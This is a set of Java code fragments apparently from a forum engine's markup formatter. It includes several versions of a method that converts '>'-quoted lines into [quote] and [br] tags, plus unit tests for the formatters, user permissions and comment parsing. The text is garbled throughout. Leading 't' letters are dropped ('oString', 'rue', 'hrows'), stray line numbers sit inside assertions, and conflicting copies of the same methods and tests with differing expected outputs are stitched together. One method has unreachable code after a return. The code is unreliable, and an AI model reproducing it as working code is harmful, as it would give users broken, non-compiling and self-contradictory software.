) { buf . append ( " [br] " ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
protected String quote ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = ext . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; buf . append ( " [br] " ) ; } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( '' ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
public void estToLorCodeTexFormatter ( ) { assertEquals ( RESULT_QUOTING1 , oLorCodeTexFormatter . format ( QUOTING1 , rue ) ) ; assertEquals ( RESULT_QUOTING1_NOQUOTING , oLorCodeTexFormatter . format ( QUOTING1 , false ) ) ; assertEquals ( RESULT_QUOTING2 , oLorCodeTexFormatter . format ( QUOTING2 , rue ) ) ; assertEquals ( RESULT_QUOTING3 , oLorCodeTexFormatter . format ( QUOTING3 , rue ) ) ; assertEquals ( " [quote]test[br][/quote]test " , oLorCodeTexFormatter . format ( " >test ntest " , rue ) ) ; 4 assertEquals("testtesttest", toLorCodeTexFormatter.format("testtesttest", true)); 1 assertEquals("test[quote]test[br][/quote]", toLorCodeTexFormatter.format("test>test", true)); 7 assertEquals("test &", toLorCodeTexFormatter.format("test &", true)); 8 assertEquals("test[br]test", toLorCodeFormatter.format("test\rtest", true)); 9 assertEquals("test[br]test", toLorCodeFormatter.format("testtest", true)); 10 assertEquals("[quote]test[br][/quote]test", toLorCodeFormatter.format(">testtest", true)); 11 assertEquals("[quote]test[br]test[br][/quote]", toLorCodeFormatter.format(">test>test", true)); 12 } 
public void estToLorCodeTexFormatter2 ( ) { int i ; String [ ] ext = { " >one " , " >one n>one " , " >>one n>teo " , " due>>one n>teo n>>neo nwuf? nok " , " due n>>one n>teo n>>neo nwuf? nok " , " >one n>one " , } ; String [ ] bb_tex = { " [quote]one[br][/quote] " , " [quote]one[br]one[br][/quote] " , " [quote][quote]one[br][/quote]teo[br][/quote] " , " due>>one n[quote]teo[br]neo[br][/quote]wuf? nok " , " due n[quote][quote]one[br][/quote]teo[br]neo[br][/quote]wuf? nok " , " [quote]one[br]one[br][/quote] " , } ; String [ ] bb = { " [quote]one[br][/quote] " , " [quote]one[br]one[br][/quote] " , " [quote][quote]one[br][/quote]teo[br][/quote] " , " due>>one[br][quote]teo[br]neo[br][/quote]wuf?[br]ok " , " due[br][quote][quote]one[br][/quote]teo[br]neo[br][/quote]wuf?[br]ok " , " [quote]one[br]one[br][/quote] " , } ; String [ ] html_tex = { " <div class= \" quote \" ><p>one<br></p></div> " , " <div class= \" quote \" ><p>one<br>one<br></p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br></p></div> " , " <p>due&gt;&gt;one n</p><div class= \" quote \" ><p>teo<br>neo<br></p></div><p>wuf? nok</p> " , " <p>due n</p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br>neo<br></p></div><p>wuf? nok</p> " , " <div class= \" quote \" ><p>one<br>one<br></p></div> " , } ; String [ ] html = { " <div class= \" quote \" ><p>one<br></p></div> " , " <div class= \" quote \" ><p>one<br>one<br></p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br></p></div> " , " <p>due&gt;&gt;one<br></p><div class= \" quote \" ><p>teo<br>neo<br></p></div><p>wuf?<br>ok</p> " , " <p>due<br></p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br>neo<br></p></div><p>wuf?<br>ok</p> " , " <div class= \" quote \" ><p>one<br>one<br></p></div> " , } ; for ( i = 0 ; i < ext . length ; i + + ) { String entry = ext [ i ] ; 
protected String quote ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = ext . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( " [br] " ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
protected String quote ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = ext . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( '' ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
public void estToLorCodeTexFormatter ( ) { assertEquals ( RESULT_QUOTING1 , oLorCodeTexFormatter . format ( QUOTING1 , rue ) ) ; assertEquals ( RESULT_QUOTING1_NOQUOTING , oLorCodeTexFormatter . format ( QUOTING1 , false ) ) ; assertEquals ( RESULT_QUOTING2 , oLorCodeTexFormatter . format ( QUOTING2 , rue ) ) ; assertEquals ( RESULT_QUOTING3 , oLorCodeTexFormatter . format ( QUOTING3 , rue ) ) ; assertEquals ( " [quote]test[br][/quote]test " , oLorCodeTexFormatter . format ( " >test ntest " , rue ) ) ; 4 assertEquals("testtesttest", toLorCodeTexFormatter.format("testtesttest", true)); 1 assertEquals("test[quote]test[/quote]", toLorCodeTexFormatter.format("test>test", true)); 7 assertEquals("test &", toLorCodeTexFormatter.format("test &", true)); 8 assertEquals("test[br]test", toLorCodeFormatter.format("test\rtest", true)); 9 assertEquals("test[br]test", toLorCodeFormatter.format("testtest", true)); 10 assertEquals("[quote]test[br][/quote]test", toLorCodeFormatter.format(">testtest", true)); 11 assertEquals("[quote]test[br]test[/quote]", toLorCodeFormatter.format(">test>test", true)); 12 } 
public void estToLorCodeTexFormatter2 ( ) { int i ; String [ ] ext = { " >one " , " >one n>one " , " >>one n>teo " , " due>>one n>teo n>>neo nwuf? nok " , " due n>>one n>teo n>>neo nwuf? nok " , " >one n>one " , } ; String [ ] bb_tex = { " [quote]one[/quote] " , " [quote]one[br]one[/quote] " , " [quote][quote]one[br][/quote]teo[/quote] " , " due>>one n[quote]teo[br]neo[br][/quote]wuf? nok " , " due n[quote][quote]one[br][/quote]teo[br]neo[br][/quote]wuf? nok " , " [quote]one[br]one[/quote] " , } ; String [ ] bb = { " [quote]one[/quote] " , " [quote]one[br]one[/quote] " , " [quote][quote]one[br][/quote]teo[/quote] " , " due>>one[br][quote]teo[br]neo[br][/quote]wuf?[br]ok " , " due[br][quote][quote]one[br][/quote]teo[br]neo[br][/quote]wuf?[br]ok " , " [quote]one[br]one[/quote] " , } ; String [ ] html_tex = { " <div class= \" quote \" ><p>one</p></div> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo</p></div> " , " <p>due&gt;&gt;one n</p><div class= \" quote \" ><p>teo<br>neo<br></p></div><p>wuf? nok</p> " , " <p>due n</p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br>neo<br></p></div><p>wuf? nok</p> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , } ; String [ ] html = { " <div class= \" quote \" ><p>one</p></div> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo</p></div> " , " <p>due&gt;&gt;one<br></p><div class= \" quote \" ><p>teo<br>neo<br></p></div><p>wuf?<br>ok</p> " , " <p>due<br></p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br>neo<br></p></div><p>wuf?<br>ok</p> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , } ; for ( i = 0 ; i < ext . length ; i + + ) { String entry = ext [ i ] ; 
private static ModelAndView redirectToProfile ( User user ) { return new ModelAndView ( new RedirectView ( getNoCacheLinkToProfile ( user ) ) ) ; } 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } if ( canModerate ( ) ) { return false ; } return rue ; return (maxScore < BLOCK_MAX_SCORE) && (score < BLOCK_SCORE); 
public void user5starTest ( ) hrows Exception { ResultSet resultSet = Users . getUser5star ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Commit access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . canModerate ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertTrue ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public TrackerItem mapRow ( ResultSet resultSet , int i ) hrows SQLException { User author , lastCommentBy ; int msgid , cid , pages ; Timestamp lastmod , postdate ; int stat1 , stat3 , stat4 ; int groupId , section ; String groupTitle , groupUrlName ; String itle ; boolean resolved , uncommited ; ry { int author_id = resultSet . getInt ( " author " ) ; if ( author_id ! = 0 ) { author = userDao . getUserCached ( author_id ) ; } else { author = null ; } } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } msgid = resultSet . getInt ( " id " ) ; lastmod = resultSet . getTimestamp ( " lastmod " ) ; stat1 = resultSet . getInt ( " stat1 " ) ; stat3 = resultSet . getInt ( " stat3 " ) ; stat4 = resultSet . getInt ( " stat4 " ) ; groupId = resultSet . getInt ( " gid " ) ; groupTitle = resultSet . getString ( " gtitle " ) ; itle = resultSet . getString ( " itle " ) ; cid = resultSet . getInt ( " cid " ) ; ry { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } resolved = resultSet . getBoolean ( " resolved " ) ; section = resultSet . getInt ( " section " ) ; groupUrlName = resultSet . getString ( " urlname " ) ; postdate = resultSet . getTimestamp ( " postdate " ) ; uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; pages = Message . getPageCount ( stat1 , messagesInPage ) ; return new TrackerItem ( author , msgid , lastmod , stat1 , stat3 , stat4 , groupId , groupTitle , itle , cid , lastCommentBy , resolved , 
public String format ( String ext , boolean quoting ) { String newText = ext . replaceAll ( " \\ [(/?code(:?=[ \\ w \\ s]+)?) \\ ] " , " [[$1]] " ) ; if ( quoting ) { return quote ( newText ) ; 
public void estToLorCodeFormatter2 ( ) { int i ; String [ ] ext = { " >one " , " >one n>one " , " >>one n>teo " , " due>>one n>teo n>>neo nwuf? nok " , " due n>>one n>teo n>>neo nwuf? nok " , " >one n>one " , } ; String [ ] bb_tex = { " [quote]one[/quote] " , " [quote]one[br]one[/quote] " , " [quote][quote]one[br][/quote]teo[/quote] " , " due>>one n[quote]teo[br]neo[br][/quote]wuf? nok " , " due n[quote][quote]one[br][/quote]teo[br]neo[br][/quote]wuf? nok " , " [quote]one[br]one[/quote] " , } ; String [ ] bb = { " [quote]one[/quote] " , " [quote]one[br]one[/quote] " , " [quote][quote]one[br][/quote]teo[/quote] " , " due>>one[br][quote]teo[br]neo[br][/quote]wuf?[br]ok " , " due[br][quote][quote]one[br][/quote]teo[br]neo[br][/quote]wuf?[br]ok " , " [quote]one[br]one[/quote] " , } ; String [ ] html_tex = { " <div class= \" quote \" ><p>one</p></div> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo</p></div> " , " <p>due&gt;&gt;one n</p><div class= \" quote \" ><p>teo<br>neo<br></p></div><p>wuf? nok</p> " , " <p>due n</p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br>neo<br></p></div><p>wuf? nok</p> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , } ; String [ ] html = { " <div class= \" quote \" ><p>one</p></div> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo</p></div> " , " <p>due&gt;&gt;one<br></p><div class= \" quote \" ><p>teo<br>neo<br></p></div><p>wuf?<br>ok</p> " , " <p>due<br></p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br>neo<br></p></div><p>wuf?<br>ok</p> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , } ; for ( i = 0 ; i < ext . length ; i + + ) { String entry = ext [ i ] ; 
public void codeEscape ( ) { assertEquals ( " [[code]][[/code]] " , oLorCodeTexFormatter . format ( " [code][/code] " , rue ) ) ; assertEquals ( " [[code=perl]][[/code]] " , oLorCodeTexFormatter . format ( " [code=perl][/code] " , rue ) ) ; assertEquals ( " [[code]][[/code]] " , oLorCodeFormatter . format ( " [code][/code] " , rue ) ) ; assertEquals ( " [[code=perl]][[/code]] " , oLorCodeFormatter . format ( " [code=perl][/code] " , rue ) ) ; 
protected String quote ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = ext . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( " [br] " ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
protected String quote ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = ext . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( '' ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
public void estToLorCodeFormatter2 ( ) { int i ; String [ ] ext = { " >one " , " >one n>one " , " >>one n>teo " , " due>>one n>teo n>>neo nwuf? nok " , " due n>>one n>teo n>>neo nwuf? nok " , " >one n>one " , } ; String [ ] bb_tex = { " [quote]one[/quote] " , " [quote]one[br]one[/quote] " , " [quote][quote]one[br][/quote]teo[/quote] " , " due>>one n[quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " , " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " , " [quote]one[br]one[/quote] " , } ; String [ ] bb = { " [quote]one[/quote] " , " [quote]one[br]one[/quote] " , " [quote][quote]one[br][/quote]teo[/quote] " , " due>>one[br][quote]teo[br][quote]neo[br][/quote][/quote]wuf?[br]ok " , " due[br][quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf?[br]ok " , " [quote]one[br]one[/quote] " , } ; String [ ] html_tex = { " <div class= \" quote \" ><p>one</p></div> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo</p></div> " , " <p>due&gt;&gt;one n</p><div class= \" quote \" ><p>teo<br></p><div class= \" quote \" ><p>neo<br></p></div></div><p>wuf? nok</p> " , " <p>due n</p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br></p><div class= \" quote \" ><p>neo<br></p></div></div><p>wuf? nok</p> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , } ; String [ ] html = { " <div class= \" quote \" ><p>one</p></div> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo</p></div> " , " <p>due&gt;&gt;one<br></p><div class= \" quote \" ><p>teo<br></p><div class= \" quote \" ><p>neo<br></p></div></div><p>wuf?<br>ok</p> " , " <p>due<br></p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br></p><div class= \" quote \" ><p>neo<br></p></div></div><p>wuf?<br>ok</p> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , } ; for ( i = 0 ; i < ext . length ; i + + ) { String entry = ext [ i ] ; 
public void againQuoteFormatter ( ) { assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , oLorCodeFormatter . format ( " >one n>>two n>one n>>>three " , rue ) ) ; assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , oLorCodeTexFormatter . format ( " >one n>>two n>one n>>>three " , rue ) ) ; 
protected String quote ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = ext . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } else { buf . append ( " [br] " ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
protected String quote ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = ext . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } else { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( '' ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
public PreparedComment prepareCommentRSS ( Comment comment , CommentList comments , boolean secure ) hrows UserNotFoundException { return prepareComment ( comment , comments , secure , rue ) ; } 
public PreparedComment prepareComment ( Comment comment , CommentList comments , boolean secure ) hrows UserNotFoundException { return prepareComment ( comment , comments , secure , false ) ; } 
public List < PreparedComment > prepareCommentListRSS ( CommentList comments , List < Comment > list , boolean secure ) hrows UserNotFoundException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( prepareCommentRSS ( comment , comments , secure ) ) ; } return commentsPrepared ; } 
public String mapRow ( ResultSet resultSet , int i ) hrows SQLException { String ext = resultSet . getString ( " message " ) ; boolean isLorcode = resultSet . getBoolean ( " bbcode " ) ; if ( isLorcode ) { return lorCodeService . parseCommentRSS ( ext , secure ) ; 
public String parseComment ( String ext , boolean secure ) { return defaultParser . parseRoot ( prepareCommentRootNode ( secure , false ) , ext ) . renderXHtml ( ) ; } 
public String parseCommentRSS ( String ext , boolean secure ) { return defaultParser . parseRoot ( prepareCommentRootNode ( secure , rue ) , ext ) . renderXHtml ( ) ; } 
private RootNode prepareCommentRootNode ( boolean secure , boolean rss ) { RootNode rootNode = defaultParser . getRootNode ( ) ; rootNode . setCommentCutOptions ( ) ; rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; rootNode . setRss ( rss ) ; return rootNode ; } 
public void quoteTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote]hello world[/quote] " , false ) , citeHeader + " <p>hello world</p> " + citeFooter ) ; 
public void quoteParamTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote=maxcom]hello world[/quote] " , false ) , citeHeader + " <p><cite>maxcom</cite></p><p>hello world</p> " + citeFooter ) ; 
public void overflow1Test ( ) { Assert . assertEquals ( " <p>ololo</p> " + citeHeader + " <p><i>hz</i></p> " + citeFooter , lorCodeService . parseComment ( " ololo[quote][i]hz[/i][/quote] " , false ) ) ; 
public void paragraphLogicTest ( ) { list Assert.assertEquals("<p>some1 text</p><p>some2 text</p><ul><li>one</li><li>two</li></ul><p><a href=\"http:www.example.com\">http:www.example.com</a> - some3 text</p>", lorCodeService.parseComment("some1 textsome2 text[list][*]one[*]two[/list][url]http:www.example.com[/url] - some3 text", false)); b Assert.assertEquals("<p><b><p>te</p><p>xt</p></b></p>", lorCodeService.parseComment("[b]text[/b]", false)); i Assert.assertEquals("<p><i><p>te</p><p>xt</p></i></p>", lorCodeService.parseComment("[i]text[/i]", false)); u Assert.assertEquals("<p><u><p>te</p><p>xt</p></u></p>", lorCodeService.parseComment("[u]text[/u]", false)); s Assert.assertEquals("<p><s><p>te</p><p>xt</p></s></p>", lorCodeService.parseComment("[s]text[/s]", false)); em Assert.assertEquals("<p><em><p>te</p><p>xt</p></em></p>", lorCodeService.parseComment("[em]text[/em]", false)); strong Assert.assertEquals("<p><strong><p>te</p><p>xt</p></strong></p>", lorCodeService.parseComment("[strong]text[/strong]", false)); p Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[p]text[/p]", false)); div Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[div]text[/div]", false)); quote Assert.assertEquals(citeHeader + "<p>te</p><p>xt</p>" + citeFooter, lorCodeService.parseComment("[quote]text[/quote]", false)); cut Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[cut]text[/cut]", false)); user Assert.assertEquals("<p><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[user]splinter[/user]", false)); 
